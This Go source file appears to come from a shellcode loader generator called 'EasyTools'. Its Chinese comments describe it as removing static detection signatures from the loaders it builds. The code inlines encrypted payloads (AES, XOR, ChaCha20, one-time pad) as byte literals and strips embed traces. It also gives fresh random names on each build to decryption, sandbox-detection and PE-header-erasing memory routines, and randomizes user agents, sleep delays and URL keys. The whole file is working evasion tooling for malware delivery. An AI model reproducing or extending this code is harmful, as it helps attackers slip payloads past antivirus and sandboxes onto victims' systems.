package util

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// ---------------------------------------------------------------------------
// 生成期静态特征消除：
// 1. 将原 go:embed 的固定数据文件（XorEncrypted.txt 等）内联为字节字面量，
//    生成的二进制中不再出现任何固定文件名 / embeddedFiles 变量。
// 2. 对生成源码中的固定标识符（函数名、变量名、别名）做每次生成均不同的随机重命名，
//    避免同一工具族生成样本间共享的静态特征。
// ---------------------------------------------------------------------------

// payloadDataFiles 各加密数据文件在临时目录中的名称（与 makeFile/upload 写入保持一致）。
var payloadDataFiles = map[string]string{
	"AesEncrypted":       "AesEncrypted.txt",
	"AesKey":             "AesKey.txt",
	"XorEncrypted":       "XorEncrypted.txt",
	"XorKey":             "XorKey.txt",
	"ChaCha20Encrypted":  "ChaCha20Encrypted.txt",
	"ChaCha20Key":        "ChaCha20Key.txt",
	"ChaCha20Nonce":      "ChaCha20Nonce.txt",
	"UrlOrFileEncrypted": "UrlOrFileEncrypted.txt",
	// OTP 一次一密：载荷文件为 密文‖全长随机密钥（2N 字节），就地解码
	"OtpEncrypted": "OtpEncrypted.txt",
}

// payloadMustNotEmpty 内联占位符出现在生成源码中时，对应数据文件必须存在且非空。
// （UrlOrFileEncrypted 在某些流程下允许为空，不在此列）
var payloadMustNotEmpty = map[string]bool{
	"AesEncrypted":      true,
	"AesKey":            true,
	"XorEncrypted":      true,
	"XorKey":            true,
	"ChaCha20Encrypted": true,
	"ChaCha20Key":       true,
	"ChaCha20Nonce":     true,
	"OtpEncrypted":      true,
}

// InlinePayloadData 将源码中的 //__DATA_<Name>__ 占位符替换为内联字节字面量，
// 并移除模板中的 go:embed 指令与 embeddedFiles 声明。
// 若占位符存在但所需数据文件缺失/为空，直接返回错误（原实现静默注入 []byte{}，
// 生成的 exe 编译成功却带着空载荷，运行期必然 panic/永不执行，且难以定位）。
func InlinePayloadData(source string) (string, error) {
	dir := filepath.Join(os.TempDir(), "EasyTools", "file")
	for name, fname := range payloadDataFiles {
		marker := "//__DATA_" + name + "__"
		if !strings.Contains(source, marker) {
			continue
		}
		data, err := os.ReadFile(filepath.Join(dir, fname))
		if err != nil {
			return "", fmt.Errorf("载荷数据文件 %s 缺失（需要内联 %s），请重新点击shellcode处理", fname, name)
		}
		if payloadMustNotEmpty[name] && len(data) == 0 {
			return "", fmt.Errorf("载荷数据文件 %s 为空（需要内联 %s），请重新点击shellcode处理", fname, name)
		}
		source = strings.ReplaceAll(source, marker, goByteSliceLiteral(data))
	}

	// 移除 go:embed 指令行
	embedRe := regexp.MustCompile(`(?m)^[ \t]*//go:embed[^\n]*\n?`)
	source = embedRe.ReplaceAllString(source, "")
	// 移除 embeddedFiles 变量声明行
	varRe := regexp.MustCompile(`(?m)^[ \t]*var embeddedFiles embed\.FS[^\n]*\n?`)
	source = varRe.ReplaceAllString(source, "")
	// 移除 "embed" 相关 import（含别名 _ "embed"）
	importRe := regexp.MustCompile(`(?m)^[ \t]*_?[ \t]*"embed"[^\n]*\n?`)
	source = importRe.ReplaceAllString(source, "")
	// 清理可能遗留的空行（连续空行合并为单个）
	source = regexp.MustCompile(`\n{3,}`).ReplaceAllString(source, "\n\n")
	return source, nil
}

// goByteSliceLiteral 将字节数据转为 Go []byte 字面量。
func goByteSliceLiteral(data []byte) string {
	if len(data) == 0 {
		return "[]byte{}"
	}
	var sb strings.Builder
	sb.WriteString("[]byte{")
	for i, b := range data {
		if i > 0 {
			sb.WriteByte(',')
		}
		sb.WriteString(fmt.Sprintf("0x%02x", b))
	}
	sb.WriteByte('}')
	return sb.String()
}

// 每次生成均随机化的固定标识符（这些名称从不作为字符串字面量出现，可安全全局替换）。
var staticIdentifiers = []string{
	// 解码相关函数 / 变量
	"XorDecrypt", "XorKeyData", "XorEncrypted", "XOR", "NOT", "RotateLeft", "RotateRight",
	"AesDecrypt", "AesKey", "AesEncrypted",
	"ChaCha20Encrypt", "ChaCha20Decrypt", "ChaCha20Encrypted", "ChaCha20Key", "ChaCha20Nonce",
	"OtpBlobDecode", "otpData", "otpN", "otpI",
	"UnxorURLOrFileName", "encFileName", "deFileName", "EncByteArray",
	// 沙箱检测
	"isSleepInsufficient", "isCPULow", "inputRunString",
	// import 别名
	"timmee", "yuanchengIO", "yuanchengHex", "fmt1",
	// 模板局部变量
	"kernel32", "ntdll", "User32", "Gdi32", "Dbghelp",
	"addr", "oldProtect", "Process", "Proces", "Thr", "ThrD", "dc", "byteArray",
	// OTP 就地解码注入块的局部名（每次生成随机化，避免样本间共享名）
	"_otpHalf", "_otpPtr", "_otpI",
	// 执行期内存卫生守卫注入块的局部名（staging 释放 + PE 头抹除）
	"memScanDelay", "memStageBase", "memStageSpan", "memProc", "memFoundPE",
	"memAddr", "memMbi", "memErr", "memAlloc", "memHdr", "memRead", "memHdrSize",
	"memE", "memOpt", "memSoh", "memOld", "memSlice", "memI", "memOld2",
	"memCur", "memLimit", "memZ", "memZi", "memNext",
}

var identPattern = regexp.MustCompile(`\b[A-Za-z_][A-Za-z0-9_]*\b`)

// randomIdent 生成随机的合法 Go 标识符（不与内置关键字冲突）。
func randomIdent() string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	const lettersDigits = letters + "0123456789"
	length := 6 + mustRandInt(10) // 6-15 字符
	b := make([]byte, length)
	n, _ := rand.Read(b)
	if n != length {
		return "g" + hex.EncodeToString(b[:8])
	}
	b[0] = letters[int(b[0])%len(letters)]
	for i := 1; i < length; i++ {
		b[i] = lettersDigits[int(b[i])%len(lettersDigits)]
	}
	return string(b)
}

func mustRandInt(max int) int {
	if max <= 1 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return 0
	}
	return int(n.Int64())
}

// MutateIdentifiers 对生成源码做标识符随机化重命名（每次生成结果均不同）。
// 仅替换代码上下文中的标识符：字符串字面量 / 原始字符串 / rune 字面量 / 注释一律跳过，
// 避免把 "kernel32.dll"、函数名文本等一并随机改名（否则 NewLazyDLL("随机名.dll")
// 在运行期 LoadLibrary 必然失败，导致生成的 loader 永远无法执行载荷）。
func MutateIdentifiers(source string) string {
	if len(source) == 0 || len(staticIdentifiers) == 0 {
		return source
	}

	// 为每个目标标识符生成唯一替换名（同名只生成一次）
	repl := make(map[string]string, len(staticIdentifiers))
	for _, ident := range staticIdentifiers {
		if _, done := repl[ident]; !done {
			repl[ident] = randomIdent()
		}
	}

	var b strings.Builder
	b.Grow(len(source))
	n := len(source)
	for i := 0; i < n; {
		c := source[i]
		switch {
		case c == '/' && i+1 < n && source[i+1] == '/':
			// 行注释：原样保留至行尾
			if j := strings.IndexByte(source[i:], '\n'); j < 0 {
				b.WriteString(source[i:])
				return b.String()
			} else {
				b.WriteString(source[i : i+j])
				i += j
			}
		case c == '/' && i+1 < n && source[i+1] == '*':
			// 块注释：原样保留
			if j := strings.Index(source[i+2:], "*/"); j < 0 {
				b.WriteString(source[i:])
				return b.String()
			} else {
				b.WriteString(source[i : i+2+j])
				i += 2 + j
			}
		case c == '"':
			// 字符串字面量：原样跳过（处理 \" 转义）
			b.WriteByte(c)
			i++
			for i < n {
				if source[i] == '\\' && i+1 < n {
					b.WriteByte(source[i])
					b.WriteByte(source[i+1])
					i += 2
					continue
				}
				b.WriteByte(source[i])
				i++
				if source[i-1] == '"' {
					break
				}
			}
		case c == '`':
			// 原始字符串字面量：原样跳过
			if j := strings.IndexByte(source[i+1:], '`'); j < 0 {
				b.WriteString(source[i:])
				return b.String()
			} else {
				b.WriteString(source[i : i+j+2])
				i += j + 2
			}
		case c == '\'':
			// rune 字面量：原样跳过（处理 \' 转义）
			b.WriteByte(c)
			i++
			for i < n {
				if source[i] == '\\' && i+1 < n {
					b.WriteByte(source[i])
					b.WriteByte(source[i+1])
					i += 2
					continue
				}
				b.WriteByte(source[i])
				i++
				if source[i-1] == '\'' {
					break
				}
			}
		case isGoIdentStart(c):
			// 代码上下文中的标识符：按映射重命名
			j := i + 1
			for j < n && isGoIdentPart(source[j]) {
				j++
			}
			token := source[i:j]
			if r, ok := repl[token]; ok {
				b.WriteString(r)
			} else {
				b.WriteString(token)
			}
			i = j
		default:
			b.WriteByte(c)
			i++
		}
	}
	return b.String()
}

func isGoIdentStart(c byte) bool {
	return c == '_' || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c >= 0x80
}

func isGoIdentPart(c byte) bool {
	return isGoIdentStart(c) || (c >= '0' && c <= '9')
}

// RandomizeSandboxToken 将 //__SANDBOX_TOKEN__ 替换为运行口令：
// 优先使用前端用户输入的口令（SandboxToken.txt，由 make 接口写入），否则随机生成。
func RandomizeSandboxToken(source string) string {
	token := randomIdent() + "-" + randomIdent()
	if data, err := os.ReadFile(filepath.Join(os.TempDir(), "EasyTools", "file", "SandboxToken.txt")); err == nil {
		t := strings.TrimSpace(string(data))
		if len(t) >= 4 && len(t) <= 64 {
			token = t
		}
	}
	return strings.ReplaceAll(source, "//__SANDBOX_TOKEN__", token)
}

// randomUserAgents 常用 UA 池，生成时随机挑选，避免固定 UA 特征。
var randomUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
}

// RandomizeUserAgent 将 //__USER_AGENT__ 替换为随机 UA。
func RandomizeUserAgent(source string) string {
	ua := randomUserAgents[mustRandInt(len(randomUserAgents))]
	return strings.ReplaceAll(source, "//__USER_AGENT__", ua)
}

// RandomizeUrlXorKey 将 //__URL_XOR_KEY__ 替换为本次生成实际使用的随机 XOR 密钥。
func RandomizeUrlXorKey(source string) string {
	key := byte(0x88)
	if data, err := os.ReadFile(filepath.Join(os.TempDir(), "EasyTools", "file", "UrlXorKey.txt")); err == nil && len(data) > 0 {
		key = data[0]
	}
	return strings.ReplaceAll(source, "//__URL_XOR_KEY__", fmt.Sprintf("%d", key))
}

var sleepPattern = regexp.MustCompile(`\btime\.Sleep\(\s*\d+\s*\)`)

// RandomizeSleep 将模板中的固定 time.Sleep(N) 随机化时长。
func RandomizeSleep(source string) string {
	ms := 3000 + mustRandInt(27000) // 3-30 秒
	return sleepPattern.ReplaceAllString(source, fmt.Sprintf("time.Sleep(%d * time.Millisecond)", ms))
}

// FinalizeGeneratedSource 生成源码收尾：内联数据 -> 随机口令/UA/休眠/URL密钥 -> 标识符随机化。
func FinalizeGeneratedSource(source string) (string, error) {
	var err error
	source, err = InlinePayloadData(source)
	if err != nil {
		return "", err
	}
	source = RandomizeSandboxToken(source)
	source = RandomizeUserAgent(source)
	source = RandomizeUrlXorKey(source)
	source = RandomizeSleep(source)
	source = MutateIdentifiers(source)
	return source, nil
}
